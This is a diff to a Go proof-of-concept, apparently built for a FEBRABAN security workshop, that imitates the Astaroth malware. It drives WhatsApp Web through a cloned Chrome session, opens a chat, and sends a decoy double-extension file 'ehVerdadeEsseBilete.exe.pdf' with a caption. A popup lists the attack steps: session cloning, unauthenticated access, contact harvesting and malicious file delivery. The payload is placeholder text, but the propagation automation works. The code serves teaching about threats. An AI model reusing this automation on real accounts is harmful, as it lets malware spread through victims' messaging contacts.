@@ -388,46 +388,152 @@ func main() {
 		}
 	}()
 
-	// ETAPA 4: Demonstração de injeção
-	fmt.Println("\n[4/4] Selecione um chat no navegador e pressione ENTER para demonstrar a injeção...")
-	fmt.Println("      (O monitoramento continua em segundo plano...)")
+	// ETAPA 4: Grand Finale - Envio automático para o próprio chat
+	fmt.Println("\n[4/4] GRAND FINALE: Enviando mensagem para o próprio chat...")
+	fmt.Println("[*] Procurando chat 'Eu' na lista...")
 
-	var inputStr string
-	fmt.Scanln(&inputStr)
-
-	chatBox, err := page.Element("div[contenteditable='true'][data-tab='10']")
-	if err != nil {
-		log.Printf("[!] Não foi possível encontrar a caixa de texto: %v", err)
-		fmt.Println("[*] Pressione ENTER para fechar...")
-		fmt.Scanln(&inputStr)
-		return
+	// Busca o chat "Eu" na lista de conversas
+	var targetChat *rod.Element
+	spans, _ := page.Elements("span[dir='auto'][title]")
+	for _, span := range spans {
+		title, _ := span.Attribute("title")
+		if title != nil && *title == "Eu" {
+			targetChat = span
+			fmt.Println("[+] Chat 'Eu' encontrado! Clicando...")
+			break
+		}
 	}
-	chatBox.MustClick().MustInput(TestMessage)
-	chatBox.MustType(input.Enter)
 
-	// Popup final
+	if targetChat == nil {
+		fmt.Println("[!] Chat 'Eu' não encontrado. Tentando pelo primeiro chat...")
+		// Fallback: clica no primeiro chat da lista
+		firstRow, err := page.Element("div[role='row']")
+		if err != nil {
+			log.Printf("[!] Nenhum chat encontrado: %v", err)
+			fmt.Println("[*] Pressione ENTER para fechar...")
+			var s string
+			fmt.Scanln(&s)
+			return
+		}
+		firstRow.MustClick()
+	} else {
+		targetChat.MustClick()
+	}
+
+	time.Sleep(2 * time.Second)
+	fmt.Println("[+] Chat aberto!")
+
+	// Cria o arquivo falso "ehVerdadeEsseBilete.exe.pdf"
+	fakeFileName := "ehVerdadeEsseBilete.exe.pdf"
+	fakePath := filepath.Join(os.TempDir(), fakeFileName)
+	fakeContent := []byte("[ASTAROTH POC] Este arquivo é uma demonstração educacional.\nEm um ataque real, seria um downloader malicioso.\nFEBRaBAN Workshop - Análise de Ameaças Cibernéticas\n")
+	os.WriteFile(fakePath, fakeContent, 0644)
+	defer os.Remove(fakePath)
+	fmt.Printf("[+] Arquivo falso criado: %s\n", fakePath)
+
+	// Clica no botão de anexo (+)
+	fmt.Println("[*] Abrindo menu de anexo...")
+	attachBtn, err := page.Element("[data-testid='clip']")
+	if err != nil {
+		// Fallback: tenta o seletor alternativo
+		attachBtn, err = page.Element("div[title='Attach']")
+	}
+	if err != nil {
+		attachBtn, _ = page.Element("span[data-icon='plus']")
+	}
+
+	if attachBtn != nil {
+		attachBtn.MustClick()
+		time.Sleep(1 * time.Second)
+
+		// Encontra o input de arquivo e define o arquivo
+		// O WhatsApp cria inputs[type=file] quando o menu de anexo abre
+		fileInputs, _ := page.Elements("input[type='file']")
+		if len(fileInputs) > 0 {
+			fmt.Println("[+] Input de arquivo encontrado! Enviando anexo...")
+			fileInputs[0].MustSetFiles(fakePath)
+			time.Sleep(3 * time.Second)
+
+			// Adiciona a legenda/caption na caixa de texto do modal de envio
+			captionBox, err := page.Element("div[contenteditable='true']")
+			if err == nil {
+				captionMsg := "That's all folks! Obrigado pela participação e presença nesse Workshop da FEBRABAN!"
+				captionBox.MustClick().MustInput(captionMsg)
+				time.Sleep(1 * time.Second)
+
+				// Clica em enviar (botão verde)
+				sendBtn, err := page.Element("[data-testid='send']")
+				if err != nil {
+					sendBtn, _ = page.Element("span[data-icon='send']")
+				}
+				if sendBtn != nil {
+					sendBtn.MustClick()
+					fmt.Println("[+] Mensagem com anexo enviada!")
+				} else {
+					// Fallback: envia com Enter
+					captionBox.MustType(input.Enter)
+					fmt.Println("[+] Mensagem com anexo enviada (via Enter)!")
+				}
+			}
+		} else {
+			fmt.Println("[!] Input de arquivo não encontrado. Enviando apenas texto...")
+			// Fallback: envia somente a mensagem de texto
+			sendTextOnly(page)
+		}
+	} else {
+		fmt.Println("[!] Botão de anexo não encontrado. Enviando apenas texto...")
+		sendTextOnly(page)
+	}
+
+	time.Sleep(2 * time.Second)
+
+	// Popup GRAND FINALE
 	mu.Lock()
 	totalContacts := len(collectedContacts)
 	mu.Unlock()
 
 	go messageBox(
-		"Astaroth POC - Injecao Concluida",
+		"Astaroth POC - GRAND FINALE",
 		fmt.Sprintf(
-			"Mensagem enviada com sucesso!\n\n"+
-				"Conteudo: \"%s\"\n\n"+
-				"Em um cenario real, essa mensagem\n"+
-				"conteria um link para o proximo\n"+
-				"estagio do malware (downloader).\n\n"+
-				"Total de contatos coletados: %d",
-			TestMessage,
+			"DEMONSTRACAO CONCLUIDA!\n\n"+
+				"O que o malware fez:\n"+
+				"------------------------------\n"+
+				"1. Clonou a sessao do Chrome\n"+
+				"2. Abriu o WhatsApp SEM autenticacao\n"+
+				"3. Coletou %d contatos\n"+
+				"4. Enviou arquivo malicioso\n"+
+				"------------------------------\n\n"+
+				"Arquivo: ehVerdadeEsseBilete.exe.pdf\n\n"+
+				"Em um cenario real, esse arquivo\n"+
+				"seria o downloader do proximo\n"+
+				"estagio do Astaroth.\n\n"+
+				"That's all folks!\n"+
+				"FEBRABAN Workshop 2026",
 			totalContacts,
 		),
-		MB_ICONINFORMATION|MB_TOPMOST,
+		MB_ICONWARNING|MB_TOPMOST,
 	)
 
-	fmt.Printf("[+] Mensagem injetada: %s\n", TestMessage)
+	fmt.Println("\n[!!] ==========================================")
+	fmt.Println("[!!]  GRAND FINALE - DEMONSTRAÇÃO CONCLUÍDA!")
+	fmt.Println("[!!] ==========================================")
 	fmt.Println("[*] POC concluída. Pressione ENTER para fechar.")
+	var inputStr string
 	fmt.Scanln(&inputStr)
+}
+
+// sendTextOnly envia apenas a mensagem de texto sem anexo (fallback)
+func sendTextOnly(page *rod.Page) {
+	chatBox, err := page.Element("div[contenteditable='true'][data-tab='10']")
+	if err != nil {
+		chatBox, _ = page.Element("div[contenteditable='true']")
+	}
+	if chatBox != nil {
+		msg := "That's all folks! Obrigado pela participação e presença nesse Workshop da FEBRABAN! 🎯"
+		chatBox.MustClick().MustInput(msg)
+		chatBox.MustType(input.Enter)
+		fmt.Println("[+] Mensagem de texto enviada!")
+	}
 }
 
 func formatContacts(contacts []string) string {
